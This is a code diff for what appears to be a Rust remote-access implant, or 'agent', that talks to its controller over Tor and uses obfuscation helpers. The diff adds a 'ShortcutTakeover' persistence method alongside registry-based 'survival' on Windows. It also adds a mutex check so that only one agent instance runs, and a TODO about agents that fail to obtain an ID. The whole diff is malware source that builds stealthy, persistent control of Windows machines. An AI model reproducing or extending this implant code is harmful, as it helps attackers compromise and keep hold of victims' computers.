@@ -3,6 +3,7 @@ mod helpers;
 mod exc;
 mod debug;
 mod win_persist;
+mod mutex;
 
 use arti_client::{
     TorClient,
@@ -10,7 +11,7 @@ use arti_client::{
     StreamPrefs,
     DataStream,
 };
-use config::Persistence;
+use config::{get_mutex_name, Persistence};
 use goldberg::goldberg_int;
 use tokio::io::{
     AsyncWriteExt,
@@ -51,11 +52,21 @@ struct OutputMessage {
 fn persist(id: &str) -> bool{
         // Persitence:
     match config::persistence() {
-        Persistence::NO => {
+        Persistence::None => {
             debug_println!("no persistence mechanism enabled");
         },
-        Persistence::WinRegistryBased => {
+        Persistence::WindowsRegistry => {
             match win_persist::classic_registry_based_survival(&config::get_reg_program_name().clone(), &id) {
+                Ok(_) => {
+                    return true;
+                },
+                Err(e) => {
+                    debug_eprintln!("failed to persist on windows: {}", e);
+                },
+            }
+        },
+        Persistence::ShortcutTakeover => {
+            match win_persist::shortcut_takeover(&id) {
                 Ok(_) => {
                     return true;
                 },
@@ -71,6 +82,22 @@ fn persist(id: &str) -> bool{
 #[tokio::main]
 async fn main() {
     helpers::set_working_dir_to_program_dir();
+
+    if get_mutex_name().len() != 0 {
+        match mutex::create_program_mutex() {
+            Ok(mutex_already_exists) => {
+                if mutex_already_exists {
+                    // We exit due to another instance of an agent running.
+                    debug_println!("another instance of an agent detected... exiting.");
+                    std::process::exit(0);
+                }
+                debug_println!("no mutex found... first agent instance");
+            },
+            Err(e) => {
+                debug_eprintln!("failed to create program mutex: {}", e);
+            },
+        }
+    }
 
     // Agent's configuration:
     let address = config::get_address();
@@ -143,6 +170,8 @@ async fn main() {
             continue;
         }
 
+        // TODO: There is an issue. If an agent fails to
+        // acquire an ID then it won't persist. Fix this.
         persist(&id);
 
         debug_println!("fetching messages");
